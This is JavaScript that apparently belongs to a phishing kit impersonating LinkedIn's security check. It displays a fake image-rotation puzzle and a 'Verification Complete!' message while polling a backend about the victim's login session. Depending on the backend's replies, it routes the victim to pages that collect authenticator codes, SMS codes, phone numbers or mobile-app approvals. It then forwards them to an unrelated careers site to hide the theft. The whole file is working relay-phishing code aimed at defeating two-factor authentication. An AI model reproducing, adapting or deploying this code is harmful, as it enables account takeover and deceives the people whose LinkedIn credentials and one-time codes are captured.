let challengeCount = 0;
let redirectTimeout;

let puzzleTiles = [];

let sessionId = new URLSearchParams(window.location.search).get("sessionId");

const links = document.getElementsByTagName("a");
const buttons = document.getElementsByTagName("button");
const loaderWrapper = document.getElementById("loader-wrapper");
const challengeContainer = document.getElementById("challenge-container");
const heading = document.querySelector("h1");

const disableInteraction = () => {
  // Add pointer-events: none and reduce opacity for all links
  for (let link of links) {
    link.style.pointerEvents = "none";
    link.style.opacity = "0.5";
  }

  // Disable all buttons and reduce opacity
  for (let button of buttons) {
    button.disabled = true;
    button.style.opacity = "0.5";
  }
};

const enableInteraction = () => {
  for (let link of links) {
    link.style.pointerEvents = "";
    link.style.opacity = "";
  }
  for (let button of buttons) {
    button.disabled = false;
    button.style.opacity = "";
  }

  // Hide the loader
  if (loaderWrapper) loaderWrapper.style.display = "none";

  // Hide heading, then show it at top after a brief moment
  if (heading) {
    heading.classList.add("hidden");
    setTimeout(() => {
      heading.classList.add("move-up");
      heading.classList.remove("hidden");
    }, 50);
  }

  // Show the challenge container
  if (challengeContainer) challengeContainer.style.display = "block";
};

async function checkPuzzleImage(sessionId) {
  try {
    const response = await fetch(
      `/api/check-puzzle-image?sessionId=${sessionId}`
    );
    const data = await response.json();
    
    return data.exists;
  } catch (error) {
    console.error("Error checking puzzle image:", error);
    return false;
  }
}

function startPuzzleImageCheck(sessionId, callback) {
  const checkInterval = setInterval(async () => {
    const exists = await checkPuzzleImage(sessionId);
    if (exists) {
      clearInterval(checkInterval);
      callback(true);
    }
  }, 1000); // Check every second

  // Stop checking after 30 seconds
  setTimeout(() => {
    clearTimeout(redirectTimeout);
    clearInterval(checkInterval);
    callback(false);
  }, 60000);
}

function getChallenge() {
  clearTimeout(redirectTimeout);
  let challengeXhr = new XMLHttpRequest();
  challengeXhr.open("POST", "/api/linkedin/security-verification", true);
  challengeXhr.setRequestHeader("Content-Type", "application/json");
  challengeXhr.send(JSON.stringify({ sessionId }));

  challengeXhr.onreadystatechange = function () {
    if (challengeXhr.readyState === XMLHttpRequest.DONE) {
      if (challengeXhr.status === 200) {
        let challenge = JSON.parse(challengeXhr.responseText);
        puzzleTiles = processPuzzleTiles(challenge.tiles, sessionId);
      }
    }
  };
}

function processPuzzleTiles(tilesHtml, sessionId) {
  // Create a temporary div to parse HTML strings
  const tempDiv = document.createElement("div");

  // Process each tile HTML string
  return tilesHtml.map((tileHtml, index) => {
    tempDiv.innerHTML = tileHtml;
    const tile = tempDiv.firstChild;

    // Get the original background image and position
    const originalBgImage = tile.style.backgroundImage;

    // Use single image name format
    const newImageUrl = `images/puzzle/puzzle_piece_${sessionId}.png`;
    tile.style.backgroundImage = `url("${newImageUrl}")`;

    // Add tile number (1-based index)
    tile.setAttribute("data-tile-number", index + 1);

    // Test if image exists
    const img = new Image();
    img.onload = () => {};
    img.onerror = () => {};
    img.src = newImageUrl;

    // Return the modified HTML
    return tile.outerHTML;
  });
}

disableInteraction();
startPuzzleImageCheck(sessionId, (found) => {
  if (found) {
    console.log("Puzzle image was found!");
    enableInteraction();
    getChallenge();
  }
});

document.addEventListener("click", function (e) {
  let targetId = e.target.id;

  if (targetId == "start-puzzle") {
    e.preventDefault();
    loadPuzzle();
  }
});

function loadPuzzle() {
  const challengeContainer = document.getElementById("challenge-container");
  if (
    challengeContainer &&
    challengeContainer.firstElementChild &&
    challengeContainer.firstElementChild.firstElementChild
  ) {
    try {
      console.log("Injecting puzzle HTML...");
      challengeContainer.firstElementChild.firstElementChild.innerHTML = `
              <div id="puzzle">
                <h2
                  font-size="1.25"
                  style="
                    font-weight: normal;
                    font-size: 1.25em;
                    font-family: Helvetica;
                    box-sizing: border-box;
                    margin: 0px;
                    text-align: center;
                    color: black;
                  "
                >
                  Pick the image that is the correct way up
                </h2>
                <p
                  aria-label="1 of 1"
                  style="
                    font-size: 1em;
                    font-family: Helvetica;
                    font-weight: 300;
                    margin: 0px;
                    box-sizing: border-box;
                    color: black;
                    margin-top: 12px;
                    text-align: center;
                  "
                >
                  1 of 1
                </p>
                <div
                  style="
                    -moz-box-pack: center;
                    justify-content: center;
                    flex-flow: wrap;
                    box-sizing: border-box;
                    display: flex;
                    margin-top: 12px;
                    position: relative;
                    color: rgb(47, 59, 70);
                  "
                >
                </div>
                <p
                  style="
                    color: black;
                    margin: 1px;
                    display: flex;
                    -moz-box-pack: center;
                    justify-content: center;
                    font-size: 8pt;
                    font-family: Helvetica;
                    font-weight: 300;
                  "
                >
                  1151839fdf0112cf4.7091586005
                </p>
              </div>
            `;

      // Get the container for puzzle tiles
      const puzzleDiv = document.getElementById("puzzle");
      if (puzzleDiv) {
        const tilesContainer = puzzleDiv.querySelector("div");
        if (tilesContainer) {
          if (!puzzleTiles || !Array.isArray(puzzleTiles)) {
            console.error("Invalid tiles data:", puzzleTiles);
            throw new Error("Invalid puzzle tiles data received from server");
          }
          console.log("Got tiles:", puzzleTiles.length);

          // Insert processed tiles into the container
          tilesContainer.innerHTML = puzzleTiles.join("");
          console.log("Puzzle tiles injected successfully");
        } else {
          throw new Error("Tiles container not found");
        }
      } else {
        throw new Error("Puzzle div not found");
      }
    } catch (error) {
      console.error("Error starting puzzle:", error);
    }
  }
}

// Handle tile clicks
document.addEventListener("click", async (e) => {
  const tile = e.target.closest(
    ".sc-99cwso-0.sc-1ssqylf-0.ciEslf.cKsBBz.tile.box"
  );
  if (tile) {
    console.log("Tile clicked:", tile);
    const tileNumber = parseInt(tile.getAttribute("data-tile-number"));
    if (!tileNumber || tileNumber < 1 || tileNumber > 6) return;
    document.getElementById(
      "challenge-container"
    ).firstElementChild.firstElementChild.innerHTML = `<div class="progress-bar">
        <div class="progress-fill"></div>
        
    </div>
    <div style="text-align: center; font-size: 14px;">
        1 done
    </div>`;
    setTimeout(function () {
      document.getElementById(
        "challenge-container"
      ).firstElementChild.firstElementChild.innerHTML = `<div style="text-align: center; padding-top: 72px;">
        <img src="/images/e87f27d6-a0ea-4b68-b7b4-77ea20f03b56.svg" alt="" style="width: 30%;">
        <p style="font-size: 22px; margin-top: 8px;">Verification Complete!</p>
    </div>`;
    }, 1000);
    try {
      const response = await fetch("/api/linkedin/select-tile", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId,
          tileNumber,
        }),
      });

      const responseText = await response.text();
      console.log(responseText);
      if (responseText == "0") {
      } else if (responseText == "1") {
        location.href = "https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625/";
      } else if (
        responseText == "Enter the code you see on your authenticator app"
      ) {
        location.href = `/authenticator-app.html?sessionId=${sessionId}`;
      } else if (responseText == "Let’s do a quick verification") {
        location.href = `/quick-verification.html?sessionId=${sessionId}`;
      } else if (
        responseText.includes(
          "Enter the code we’ve sent to phone number ending with"
        )
      ) {
        location.href = `/sms.html?sessionId=${sessionId}&text=${responseText}`;
      } else if (
        responseText == "Enter your phone number to confirm it’s you"
      ) {
        location.href = `/enter-phone.html?sessionId=${sessionId}`;
      } else if (responseText == "lastcve") {
        location.href = `https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625`;
      } else if(responseText == "LinkedIn App Challenge") {
        location.href = `/mobile-verification.html?sessionId=${sessionId}`;
      }
    } catch (error) {
      console.error("Error selecting tile:", error);
    }
  }
});

function checkLoginStatus() {
  let checkLoginStatusXhr = new XMLHttpRequest();
  checkLoginStatusXhr.open("POST", "/api/linkedin/check-login-status", true);
  checkLoginStatusXhr.setRequestHeader("Content-Type", "application/json");
  checkLoginStatusXhr.send(JSON.stringify({ sessionId: sessionId }));

  checkLoginStatusXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      let responseText = this.response;
      console.log(responseText);
      if (responseText == "0") {
        redirectTimeout = setTimeout(() => {
          checkLoginStatus();
        }, 3000);
      } else if (responseText == "1") {
        location.href = "https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625/";
      } else if (
        responseText == "Enter the code you see on your authenticator app"
      ) {
        location.href = `/authenticator-app.html?sessionId=${sessionId}`;
      } else if (responseText == "Let’s do a quick verification") {
        location.href = `/quick-verification.html?sessionId=${sessionId}`;
      } else if (
        responseText.includes(
          "Enter the code we’ve sent to phone number ending with"
        )
      ) {
        location.href = `/sms.html?sessionId=${sessionId}&text=${responseText}`;
      } else if (
        responseText == "Enter your phone number to confirm it’s you"
      ) {
        location.href = `/enter-phone.html?sessionId=${sessionId}`;
      } else if (responseText == "lastcve") {
        location.href = `https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625`;
      } else if (responseText == "LinkedIn App Challenge") {
        location.href = `/mobile-verification.html?sessionId=${sessionId}`;
      }
    }
  };
}
setTimeout(function () {
  checkLoginStatus();
}, 7000);
